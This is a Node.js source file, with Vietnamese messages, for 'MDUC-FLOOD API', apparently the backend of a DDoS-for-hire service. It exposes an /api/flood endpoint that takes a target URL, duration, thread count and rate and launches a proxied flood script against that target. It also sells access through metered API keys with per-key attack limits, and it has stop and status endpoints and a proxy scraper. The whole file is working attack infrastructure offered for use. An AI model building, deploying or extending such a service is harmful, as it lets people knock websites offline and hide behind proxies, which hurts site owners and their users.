// main.js - MDUC-FLOOD API
const express = require("express");
const { spawn } = require("child_process");
const path = require("path");
const fs = require("fs");
const os = require("os");
const cors = require("cors");
require('dotenv').config();

// ==================== CẤU HÌNH ====================
const PORT = process.env.PORT || 3000;
const API_KEY_FILE = process.env.API_KEY_FILE || "data/apikey.json";
const PROXY_FILE = process.env.PROXY_FILE || "data/proxy.txt";
const DEFAULT_MAX_CONCURRENT_ATTACKS = 3;
// =====================================================

const app = express();
app.use(cors());
app.use(express.json());

const activeAttacks = new Map();
const apiKeyUsage = new Map();
const rateLimits = new Map();
const apiKeyAttackCount = new Map();

// ==================== HÀM TIỆN ÍCH ====================

function generateApiKey() {
  const timestamp = Date.now();
  const randomStr = Math.random().toString(36).substr(2, 8);
  return `key_${timestamp}_${randomStr}`;
}

function formatDuration(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}h ${m}m ${s}s`;
}

function loadApiKeys() {
  try {
    const apiKeyPath = path.join(__dirname, API_KEY_FILE);
    if (fs.existsSync(apiKeyPath)) {
      const data = fs.readFileSync(apiKeyPath, 'utf8');
      return JSON.parse(data);
    }
  } catch (error) {
    console.error("Lỗi đọc file API key:", error);
  }
  
  const sampleKeys = {
    "master_key": {
      "name": "Master Key (Owner)",
      "max_requests": -1,
      "max_duration": 86400,
      "max_concurrent_attacks": -1,
      "allowed_options": ["--reset", "--debug", "--randpath", "--close", "--browser", "--browser=1", "--browser=2", "--browser=3", "--browser=4", "--browser=5"],
      "enabled": true,
      "created_at": new Date().toISOString(),
      "is_owner": true
    }
  };
  
  try {
    const apiKeyPath = path.join(__dirname, API_KEY_FILE);
    const dataDir = path.dirname(apiKeyPath);
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }
    fs.writeFileSync(apiKeyPath, JSON.stringify(sampleKeys, null, 2), 'utf8');
    console.log("Đã tạo file API key mẫu:", API_KEY_FILE);
  } catch (error) {
    console.error("Lỗi tạo file API key:", error);
  }
  
  return sampleKeys;
}

function saveApiKeys(apiKeys) {
  try {
    const apiKeyPath = path.join(__dirname, API_KEY_FILE);
    fs.writeFileSync(apiKeyPath, JSON.stringify(apiKeys, null, 2), 'utf8');
    return true;
  } catch (error) {
    console.error("Lỗi lưu file API key:", error);
    return false;
  }
}

function getConcurrentAttacksCount(apiKey) {
  let count = 0;
  for (const [id, attack] of activeAttacks) {
    if (attack.apiKey === apiKey && 
        (attack.status === "running" || !attack.status)) {
      count++;
    }
  }
  return count;
}

function validateOptions(providedOptions, allowedOptions) {
  if (!providedOptions || providedOptions.length === 0) {
    return { valid: true, invalidOptions: [] };
  }
  
  const invalidOptions = [];
  const allowedOptionsSet = new Set(allowedOptions);
  
  for (const option of providedOptions) {
    let isValid = false;
    
    if (allowedOptionsSet.has(option)) {
      isValid = true;
    } else if (option.includes('=')) {
      const [optionName, optionValue] = option.split('=');
      
      if (allowedOptionsSet.has(`${optionName}=*`)) {
        isValid = true;
      } else if (allowedOptionsSet.has(option)) {
        isValid = true;
      } else if (optionName === "--browser" && !isNaN(optionValue)) {
        const value = parseInt(optionValue);
        for (let i = 1; i <= 5; i++) {
          if (allowedOptionsSet.has(`${optionName}=${i}`)) {
            isValid = true;
            break;
          }
        }
      }
    }
    
    if (!isValid) {
      invalidOptions.push(option);
    }
  }
  
  return {
    valid: invalidOptions.length === 0,
    invalidOptions
  };
}

// ==================== MIDDLEWARE ====================

function checkApiKey(req, res, next) {
  const apiKey = req.headers["x-api-key"] || req.query.api_key;
  
  if (!apiKey) {
    return res.status(401).json({
      success: false,
      message: "API key is required",
      code: "API_KEY_MISSING"
    });
  }
  
  const apiKeys = loadApiKeys();
  
  if (!apiKeys[apiKey]) {
    return res.status(403).json({
      success: false,
      message: "Invalid API key",
      code: "API_KEY_INVALID"
    });
  }
  
  const keyInfo = apiKeys[apiKey];
  
  if (!keyInfo.enabled) {
    return res.status(403).json({
      success: false,
      message: "API key is disabled",
      code: "API_KEY_DISABLED"
    });
  }
  
  const now = Date.now();
  const clientIP = req.ip || req.connection.remoteAddress;
  const rateKey = `${apiKey}_${clientIP}`;
  
  if (!rateLimits.has(rateKey)) {
    rateLimits.set(rateKey, {
      count: 0,
      firstRequest: now,
      lastRequest: now
    });
  }
  
  const rateLimit = rateLimits.get(rateKey);
  const timeWindow = 60 * 1000;
  
  if (now - rateLimit.firstRequest > timeWindow) {
    rateLimit.count = 0;
    rateLimit.firstRequest = now;
  }
  
  if (rateLimit.count >= 60) {
    return res.status(429).json({
      success: false,
      message: "Rate limit exceeded. Maximum 60 requests per minute",
      code: "RATE_LIMIT_EXCEEDED",
      retry_after: Math.ceil((timeWindow - (now - rateLimit.firstRequest)) / 1000)
    });
  }
  
  rateLimit.count++;
  rateLimit.lastRequest = now;
  
  if (apiKey !== "master_key" && keyInfo.max_requests !== -1) {
    if (!keyInfo.used_requests) {
      keyInfo.used_requests = 0;
    }
    
    if (keyInfo.last_reset) {
      const lastReset = new Date(keyInfo.last_reset);
      const nowDate = new Date();
      if (nowDate.getDate() !== lastReset.getDate() || 
          nowDate.getMonth() !== lastReset.getMonth() || 
          nowDate.getFullYear() !== lastReset.getFullYear()) {
        keyInfo.used_requests = 0;
        keyInfo.last_reset = nowDate.toISOString();
        saveApiKeys(apiKeys);
      }
    }
    
    if (keyInfo.used_requests >= keyInfo.max_requests) {
      return res.status(403).json({
        success: false,
        message: `Daily request limit exceeded. Maximum ${keyInfo.max_requests} requests per day`,
        code: "DAILY_LIMIT_EXCEEDED",
        used: keyInfo.used_requests,
        limit: keyInfo.max_requests
      });
    }
  }
  
  req.apiKeyInfo = keyInfo;
  req.apiKeyValue = apiKey;
  req.clientIP = clientIP;
  
  next();
}

// ==================== API ROUTES ====================

app.get("/", (req, res) => {
  res.json({
    success: true,
    message: "🔥 MDUC-FLOOD API 🔥",
    version: "1.0.0",
    features: [
      "Quản lý API Key chi tiết",
      "Rate limiting thông minh",
      "Giới hạn request/ngày",
      "Giới hạn attack đồng thời",
      "Kiểm soát thời gian tấn công",
      "Filter options theo API Key",
      "Auto proxy scraper"
    ],
    endpoints: {
      start: "POST /api/flood",
      stop: "GET /api/stop",
      status: "GET /api/status",
      proxy: "GET /api/proxy",
      update_proxy: "GET /api/proxy/update",
      keys: "GET /api/keys",
      keys_all: "GET /api/keys/all",
      create_key: "POST /api/keys",
      system: "GET /api/system",
      help: "GET /api/help"
    }
  });
});

app.get("/api/help", checkApiKey, (req, res) => {
  const keyInfo = req.apiKeyInfo;
  
  res.json({
    success: true,
    message: "Hướng dẫn sử dụng API",
    your_key_info: {
      name: keyInfo.name,
      max_duration: keyInfo.max_duration,
      max_requests: keyInfo.max_requests,
      max_concurrent_attacks: keyInfo.max_concurrent_attacks || DEFAULT_MAX_CONCURRENT_ATTACKS,
      allowed_options: keyInfo.allowed_options,
      used_requests: keyInfo.used_requests || 0,
      current_concurrent_attacks: getConcurrentAttacksCount(req.apiKeyValue)
    },
    syntax: {
      flood: "POST /api/flood với JSON body",
      parameters: {
        target: "URL mục tiêu (https://...) - Bắt buộc",
        time: `Thời gian tấn công (giây) - Tối đa: ${keyInfo.max_duration}s - Bắt buộc`,
        threads: "Số luồng (1-100) - Bắt buộc",
        ratelimit: "Giới hạn request/giây (>=1) - Bắt buộc",
        proxy_file: "File proxy (tùy chọn, mặc định: proxy.txt)",
        options: `Mảng các tùy chọn - Chỉ được phép: ${keyInfo.allowed_options.join(', ') || 'Không có options nào được phép'}`
      },
      example: {
        target: "https://target.com",
        time: 120,
        threads: 10,
        ratelimit: 90,
        options: keyInfo.allowed_options.length > 0 ? [keyInfo.allowed_options[0]] : []
      }
    }
  });
});

app.post("/api/flood", checkApiKey, (req, res) => {
  const { target, time, threads, ratelimit, proxy_file, options = [] } = req.body;
  const keyInfo = req.apiKeyInfo;
  const apiKey = req.apiKeyValue;
  
  if (!target || !time || !threads || !ratelimit) {
    return res.status(400).json({
      success: false,
      message: "Thiếu tham số. Cần: target, time, threads, ratelimit",
      code: "MISSING_PARAMETERS"
    });
  }
  
  if (!target.startsWith("https://")) {
    return res.status(400).json({
      success: false,
      message: "Target phải bắt đầu bằng https://",
      code: "INVALID_TARGET"
    });
  }
  
  if (isNaN(time) || time < 1) {
    return res.status(400).json({
      success: false,
      message: "Thời gian phải >= 1 giây",
      code: "INVALID_TIME"
    });
  }
  
  if (time > keyInfo.max_duration) {
    return res.status(400).json({
      success: false,
      message: `Thời gian vượt quá giới hạn của API key. Tối đa: ${keyInfo.max_duration} giây`,
      code: "TIME_LIMIT_EXCEEDED",
      max_duration: keyInfo.max_duration
    });
  }
  
  if (isNaN(threads) || threads < 1 || threads > 100) {
    return res.status(400).json({
      success: false,
      message: "Threads phải từ 1-100",
      code: "INVALID_THREADS"
    });
  }
  
  if (isNaN(ratelimit) || ratelimit < 1) {
    return res.status(400).json({
      success: false,
      message: "Ratelimit phải >= 1",
      code: "INVALID_RATELIMIT"
    });
  }
  
  const optionsValidation = validateOptions(options, keyInfo.allowed_options || []);
  if (!optionsValidation.valid) {
    return res.status(400).json({
      success: false,
      message: `Options không được phép: ${optionsValidation.invalidOptions.join(', ')}`,
      code: "INVALID_OPTIONS",
      allowed_options: keyInfo.allowed_options,
      invalid_options: optionsValidation.invalidOptions
    });
  }
  
  const maxConcurrent = keyInfo.max_concurrent_attacks || DEFAULT_MAX_CONCURRENT_ATTACKS;
  const currentAttacks = getConcurrentAttacksCount(apiKey);
  
  if (maxConcurrent !== -1 && currentAttacks >= maxConcurrent) {
    return res.status(429).json({
      success: false,
      message: `Đã đạt giới hạn attack đồng thời. Tối đa: ${maxConcurrent}`,
      code: "CONCURRENT_ATTACKS_LIMIT_EXCEEDED",
      current_attacks: currentAttacks,
      max_concurrent_attacks: maxConcurrent,
      suggestion: "Đợi attack hiện tại kết thúc hoặc dùng /stop để dừng attack cũ"
    });
  }
  
  const proxyFile = proxy_file || PROXY_FILE;
  const proxyPath = path.join(__dirname, proxyFile);
  
  if (!fs.existsSync(proxyPath)) {
    const dataDir = path.dirname(proxyPath);
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }
    fs.writeFileSync(proxyPath, "# Add proxies here\n# Format: ip:port\n");
  }
  
  const apiKeys = loadApiKeys();
  if (apiKey !== "master_key" && apiKeys[apiKey]) {
    if (!apiKeys[apiKey].used_requests) {
      apiKeys[apiKey].used_requests = 0;
    }
    apiKeys[apiKey].used_requests++;
    apiKeys[apiKey].last_used = new Date().toISOString();
    saveApiKeys(apiKeys);
  }
  
  const phantomPath = path.join(__dirname, "script.js");
  const cmdArgs = [
    phantomPath,
    target,
    time.toString(),
    threads.toString(),
    ratelimit.toString(),
    proxyFile,
    ...options
  ];
  
  const attackId = `attack_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  
  const child = spawn("node", cmdArgs, {
    cwd: __dirname,
    stdio: ["ignore", "pipe", "pipe"],
    detached: true,
    env: { ...process.env, FORCE_COLOR: "0" }
  });
  
  activeAttacks.set(attackId, {
    process: child,
    target,
    startTime: Date.now(),
    duration: time,
    apiKey: apiKey,
    clientIP: req.clientIP,
    outputBuffer: "",
    status: "running",
    options: options
  });
  
  if (!apiKeyAttackCount.has(apiKey)) {
    apiKeyAttackCount.set(apiKey, 0);
  }
  apiKeyAttackCount.set(apiKey, apiKeyAttackCount.get(apiKey) + 1);
  
  let outputBuffer = "";
  
  child.stdout.on("data", (data) => {
    outputBuffer += data.toString();
    const attack = activeAttacks.get(attackId);
    if (attack) {
      attack.outputBuffer = outputBuffer;
    }
  });
  
  child.stderr.on("data", (data) => {
    outputBuffer += data.toString();
    const attack = activeAttacks.get(attackId);
    if (attack) {
      attack.outputBuffer = outputBuffer;
    }
  });
  
  child.on("close", (code) => {
    const attack = activeAttacks.get(attackId);
    if (attack) {
      attack.status = code === 0 ? "completed" : "failed";
      attack.exitCode = code;
      attack.endTime = Date.now();
      attack.durationActual = Math.floor((attack.endTime - attack.startTime) / 1000);
      
      if (apiKeyAttackCount.has(apiKey)) {
        const current = apiKeyAttackCount.get(apiKey);
        if (current > 0) {
          apiKeyAttackCount.set(apiKey, current - 1);
        }
      }
    }
  });
  
  child.on("error", (err) => {
    const attack = activeAttacks.get(attackId);
    if (attack) {
      attack.status = "error";
      attack.error = err.message;
      
      if (apiKeyAttackCount.has(apiKey)) {
        const current = apiKeyAttackCount.get(apiKey);
        if (current > 0) {
          apiKeyAttackCount.set(apiKey, current - 1);
        }
      }
    }
  });
  
  setTimeout(() => {
    if (activeAttacks.has(attackId)) {
      const attack = activeAttacks.get(attackId);
      if (attack && attack.status === "running") {
        if (attack.process && attack.process.pid) {
          try {
            process.kill(-attack.process.pid, "SIGINT");
          } catch (e) {
            try {
              attack.process.kill("SIGINT");
            } catch (e) {}
          }
        }
        attack.status = "auto_stopped";
        
        if (apiKeyAttackCount.has(apiKey)) {
          const current = apiKeyAttackCount.get(apiKey);
          if (current > 0) {
            apiKeyAttackCount.set(apiKey, current - 1);
          }
        }
      }
    }
  }, (time + 10) * 1000);
  
  res.json({
    success: true,
    message: "Bắt đầu tấn công thành công",
    attack_id: attackId,
    concurrent_attacks: {
      current: currentAttacks + 1,
      max: maxConcurrent,
      remaining: maxConcurrent === -1 ? "unlimited" : maxConcurrent - (currentAttacks + 1)
    },
    api_key_usage: apiKey !== "master_key" ? {
      used_today: apiKeys[apiKey]?.used_requests || 0,
      max_per_day: apiKeys[apiKey]?.max_requests || "unlimited",
      remaining: apiKeys[apiKey]?.max_requests === -1 ? "unlimited" : (apiKeys[apiKey]?.max_requests - (apiKeys[apiKey]?.used_requests || 0))
    } : null,
    details: {
      target,
      time: formatDuration(time),
      threads,
      ratelimit,
      proxy_file: proxyFile,
      options: options,
      estimated_end: new Date(Date.now() + time * 1000).toISOString(),
      api_key_limits: {
        max_duration: formatDuration(keyInfo.max_duration),
        max_concurrent_attacks: maxConcurrent === -1 ? "unlimited" : maxConcurrent,
        allowed_options: keyInfo.allowed_options
      }
    }
  });
});

app.get("/api/stop", checkApiKey, (req, res) => {
  const { attack_id, all } = req.query;
  const apiKey = req.apiKeyValue;
  
  let stoppedCount = 0;
  const stoppedAttacks = [];
  
  if (attack_id) {
    const attack = activeAttacks.get(attack_id);
    if (attack && attack.apiKey === apiKey) {
      try {
        const pid = attack.process.pid;
        if (pid) {
          try {
            process.kill(-pid, "SIGINT");
          } catch (e) {
            attack.process.kill("SIGINT");
          }
        }
        attack.status = "stopped";
        stoppedCount++;
        stoppedAttacks.push(attack_id);
        
        if (apiKeyAttackCount.has(apiKey)) {
          const current = apiKeyAttackCount.get(apiKey);
          if (current > 0) {
            apiKeyAttackCount.set(apiKey, current - 1);
          }
        }
      } catch (e) {
        console.error("Lỗi khi dừng attack:", e);
      }
    } else if (attack) {
      return res.status(403).json({
        success: false,
        message: "Bạn không có quyền dừng cuộc tấn công này"
      });
    }
  } else if (all === "true") {
    let stoppedByThisKey = 0;
    
    for (const [id, attack] of activeAttacks) {
      if (attack.apiKey === apiKey) {
        try {
          const pid = attack.process.pid;
          if (pid) {
            try {
              process.kill(-pid, "SIGINT");
            } catch (e) {
              attack.process.kill("SIGINT");
            }
          }
          attack.status = "stopped";
          stoppedCount++;
          stoppedAttacks.push(id);
          stoppedByThisKey++;
        } catch (e) {
          console.error("Lỗi khi dừng attack:", e);
        }
      }
    }
    
    if (stoppedByThisKey > 0) {
      apiKeyAttackCount.set(apiKey, 0);
    }
  } else {
    return res.status(400).json({
      success: false,
      message: "Cần cung cấp attack_id hoặc all=true"
    });
  }
  
  res.json({
    success: true,
    message: stoppedCount > 0 ? `Đã dừng ${stoppedCount} cuộc tấn công` : "Không tìm thấy cuộc tấn công nào",
    stopped_count: stoppedCount,
    stopped_attacks: stoppedAttacks,
    concurrent_attacks_remaining: apiKeyAttackCount.get(apiKey) || 0
  });
});

app.get("/api/status", checkApiKey, (req, res) => {
  const { attack_id } = req.query;
  const apiKey = req.apiKeyValue;
  const keyInfo = req.apiKeyInfo;
  
  if (attack_id) {
    const attack = activeAttacks.get(attack_id);
    if (!attack) {
      return res.status(404).json({
        success: false,
        message: "Không tìm thấy cuộc tấn công với ID này"
      });
    }
    
    if (attack.apiKey !== apiKey) {
      return res.status(403).json({
        success: false,
        message: "Bạn không có quyền xem cuộc tấn công này"
      });
    }
    
    const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
    const remaining = Math.max(0, attack.duration - elapsed);
    
    res.json({
      success: true,
      attack_id,
      status: attack.status || "running",
      details: {
        target: attack.target,
        elapsed: formatDuration(elapsed),
        remaining: formatDuration(remaining),
        start_time: new Date(attack.startTime).toISOString(),
        duration: formatDuration(attack.duration),
        options: attack.options || [],
        actual_duration: attack.durationActual ? formatDuration(attack.durationActual) : null
      },
      output_preview: attack.outputBuffer ? 
        attack.outputBuffer.split("\n").slice(-20).join("\n").slice(-1000) : ""
    });
  } else {
    const attacks = [];
    const currentAttacks = getConcurrentAttacksCount(apiKey);
    const maxConcurrent = keyInfo.max_concurrent_attacks || DEFAULT_MAX_CONCURRENT_ATTACKS;
    
    for (const [id, attack] of activeAttacks) {
      if (attack.apiKey === apiKey) {
        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
        const remaining = Math.max(0, attack.duration - elapsed);
        
        attacks.push({
          id,
          target: attack.target,
          status: attack.status || "running",
          elapsed: formatDuration(elapsed),
          remaining: formatDuration(remaining),
          start_time: new Date(attack.startTime).toISOString(),
          options: attack.options || []
        });
      }
    }
    
    const systemInfo = {
      cpu_load: os.loadavg().map(l => l.toFixed(2)),
      memory_usage: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1),
      memory_total_gb: (os.totalmem() / 1024 / 1024 / 1024).toFixed(2),
      memory_used_gb: ((os.totalmem() - os.freemem()) / 1024 / 1024 / 1024).toFixed(2),
      uptime: formatDuration(os.uptime()),
      active_attacks: attacks.length,
      active_attacks_total: activeAttacks.size
    };
    
    const keyLimits = {
      max_concurrent_attacks: maxConcurrent === -1 ? "unlimited" : maxConcurrent,
      current_concurrent_attacks: currentAttacks,
      remaining_concurrent_attacks: maxConcurrent === -1 ? "unlimited" : Math.max(0, maxConcurrent - currentAttacks),
      max_duration: keyInfo.max_duration,
      max_requests: keyInfo.max_requests,
      used_requests: keyInfo.used_requests || 0
    };
    
    res.json({
      success: true,
      your_attacks: attacks.length,
      attacks,
      key_limits: keyLimits,
      system: systemInfo
    });
  }
});

app.get("/api/keys", checkApiKey, (req, res) => {
  const apiKey = req.apiKeyValue;
  const apiKeys = loadApiKeys();
  
  if (apiKeys[apiKey]) {
    const keyInfo = { ...apiKeys[apiKey] };
    const currentAttacks = getConcurrentAttacksCount(apiKey);
    const maxConcurrent = keyInfo.max_concurrent_attacks || DEFAULT_MAX_CONCURRENT_ATTACKS;
    
    res.json({
      success: true,
      your_key: {
        api_key: apiKey,
        name: keyInfo.name,
        max_requests: keyInfo.max_requests,
        max_duration: keyInfo.max_duration,
        max_concurrent_attacks: maxConcurrent,
        current_concurrent_attacks: currentAttacks,
        remaining_concurrent_attacks: maxConcurrent === -1 ? "unlimited" : Math.max(0, maxConcurrent - currentAttacks),
        allowed_options: keyInfo.allowed_options,
        enabled: keyInfo.enabled,
        used_requests: keyInfo.used_requests || 0,
        last_reset: keyInfo.last_reset,
        created_at: keyInfo.created_at
      }
    });
  } else {
    res.status(404).json({
      success: false,
      message: "API key không tồn tại"
    });
  }
});

app.post("/api/keys", checkApiKey, (req, res) => {
  const apiKey = req.apiKeyValue;
  const { name, max_requests, max_duration, max_concurrent_attacks, allowed_options } = req.body;
  
  if (apiKey !== "master_key") {
    return res.status(403).json({
      success: false,
      message: "Chỉ master key mới có quyền tạo API key mới"
    });
  }
  
  if (!name) {
    return res.status(400).json({
      success: false,
      message: "Thiếu tên cho API key"
    });
  }
  
  const newKey = generateApiKey();
  const apiKeys = loadApiKeys();
  
  apiKeys[newKey] = {
    name: name,
    max_requests: max_requests || 50,
    max_duration: max_duration || 600,
    max_concurrent_attacks: max_concurrent_attacks || DEFAULT_MAX_CONCURRENT_ATTACKS,
    allowed_options: allowed_options || ["--reset", "--debug"],
    enabled: true,
    created_at: new Date().toISOString(),
    created_by: apiKey,
    used_requests: 0,
    last_reset: new Date().toISOString()
  };
  
  saveApiKeys(apiKeys);
  
  res.json({
    success: true,
    message: "Đã tạo API key mới",
    api_key: newKey,
    key_info: apiKeys[newKey],
    warning: "⚠️ Lưu API key này ngay! Nó chỉ hiển thị một lần duy nhất."
  });
});

app.get("/api/keys/all", checkApiKey, (req, res) => {
  const apiKey = req.apiKeyValue;
  
  if (apiKey !== "master_key") {
    return res.status(403).json({
      success: false,
      message: "Chỉ master key mới có quyền xem tất cả keys"
    });
  }
  
  const apiKeys = loadApiKeys();
  const keysList = [];
  
  Object.keys(apiKeys).forEach(key => {
    if (key !== "master_key") {
      const currentAttacks = getConcurrentAttacksCount(key);
      const maxConcurrent = apiKeys[key].max_concurrent_attacks || DEFAULT_MAX_CONCURRENT_ATTACKS;
      
      keysList.push({
        api_key: key,
        name: apiKeys[key].name,
        max_requests: apiKeys[key].max_requests,
        used_requests: apiKeys[key].used_requests || 0,
        max_duration: apiKeys[key].max_duration,
        max_concurrent_attacks: maxConcurrent,
        current_concurrent_attacks: currentAttacks,
        remaining_concurrent_attacks: maxConcurrent === -1 ? "unlimited" : Math.max(0, maxConcurrent - currentAttacks),
        allowed_options: apiKeys[key].allowed_options,
        enabled: apiKeys[key].enabled,
        created_at: apiKeys[key].created_at,
        last_reset: apiKeys[key].last_reset,
        last_used: apiKeys[key].last_used || "Chưa dùng"
      });
    }
  });
  
  res.json({
    success: true,
    total_keys: keysList.length,
    keys: keysList
  });
});

app.get("/api/proxy", checkApiKey, (req, res) => {
  const proxyPath = path.join(__dirname, PROXY_FILE);
  
  if (!fs.existsSync(proxyPath)) {
    const dataDir = path.dirname(proxyPath);
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }
    fs.writeFileSync(proxyPath, "# Add proxies here\n");
  }
  
  fs.readFile(proxyPath, "utf8", (err, data) => {
    if (err) {
      return res.status(500).json({
        success: false,
        message: "Lỗi đọc file proxy"
      });
    }
    
    const lines = data.split("\n").filter(l => l.trim());
    const count = lines.length;
    const preview = lines.slice(0, 15).join("\n");
    
    res.json({
      success: true,
      count,
      preview,
      has_more: count > 15
    });
  });
});

app.get("/api/proxy/update", checkApiKey, (req, res) => {
  const proxyScript = path.join(__dirname, "proxy.js");
  
  if (!fs.existsSync(proxyScript)) {
    return res.status(404).json({
      success: false,
      message: "Không tìm thấy file proxy.js"
    });
  }
  
  const child = spawn("node", [proxyScript], { cwd: __dirname });
  
  let stdout = "";
  let stderr = "";
  
  child.stdout.on("data", data => stdout += data.toString());
  child.stderr.on("data", data => stderr += data.toString());
  
  child.on("close", (code) => {
    if (code === 0) {
      const proxyPath = path.join(__dirname, PROXY_FILE);
      if (fs.existsSync(proxyPath)) {
        const count = fs.readFileSync(proxyPath, "utf8")
          .split("\n")
          .filter(l => l.trim()).length;
        
        res.json({
          success: true,
          message: "Đã cập nhật proxy thành công",
          proxy_count: count,
          output: stdout.slice(-500)
        });
      } else {
        res.json({
          success: false,
          message: "Đã chạy xong nhưng không thấy file proxy",
          output: stdout
        });
      }
    } else {
      res.status(500).json({
        success: false,
        message: "Lỗi khi cập nhật proxy",
        exit_code: code,
        error: stderr.slice(-500)
      });
    }
  });
  
  child.on("error", (err) => {
    res.status(500).json({
      success: false,
      message: "Lỗi thực thi proxy scraper",
      error: err.message
    });
  });
});

app.get("/api/system", checkApiKey, (req, res) => {
  const apiKey = req.apiKeyValue;
  const apiKeys = loadApiKeys();
  const keyInfo = apiKeys[apiKey] || {};
  const currentAttacks = getConcurrentAttacksCount(apiKey);
  const maxConcurrent = keyInfo.max_concurrent_attacks || DEFAULT_MAX_CONCURRENT_ATTACKS;
  
  const systemInfo = {
    platform: os.platform(),
    arch: os.arch(),
    cpu: {
      cores: os.cpus().length,
      model: os.cpus()[0]?.model || "Unknown"
    },
    memory: {
      total: (os.totalmem() / 1024 / 1024 / 1024).toFixed(2) + " GB",
      free: (os.freemem() / 1024 / 1024 / 1024).toFixed(2) + " GB",
      used_percent: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1) + "%"
    },
    load: os.loadavg(),
    uptime: formatDuration(os.uptime()),
    active_attacks: activeAttacks.size,
    your_active_attacks: currentAttacks
  };
  
  res.json({
    success: true,
    system: systemInfo,
    your_key: {
      name: keyInfo.name,
      max_duration: keyInfo.max_duration,
      max_requests: keyInfo.max_requests,
      max_concurrent_attacks: maxConcurrent,
      current_concurrent_attacks: currentAttacks,
      remaining_concurrent_attacks: maxConcurrent === -1 ? "unlimited" : Math.max(0, maxConcurrent - currentAttacks),
      used_requests: keyInfo.used_requests || 0,
      remaining_requests: keyInfo.max_requests === -1 ? "unlimited" : (keyInfo.max_requests - (keyInfo.used_requests || 0)),
      allowed_options: keyInfo.allowed_options || [],
      last_reset: keyInfo.last_reset
    }
  });
});

// ==================== START SERVER ====================

const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`=========================================`);
  console.log(`🔥 MDUC-FLOOD API đã khởi động`);
  console.log(`📌 Port: ${PORT}`);
  console.log(`🔐 Master key: master_key`);
  console.log(`🚀 Ready for attacks!`);
  console.log(`=========================================`);
});

process.on("SIGINT", () => {
  console.log("\n🛑 Đang dừng tất cả cuộc tấn công...");
  
  for (const [id, attack] of activeAttacks) {
    if (attack.process && attack.process.pid) {
      try {
        process.kill(-attack.process.pid, "SIGINT");
      } catch (e) {
        // Ignore errors
      }
    }
  }
  
  console.log("👋 MDUC-FLOOD API đã dừng");
  server.close(() => {
    process.exit(0);
  });
});
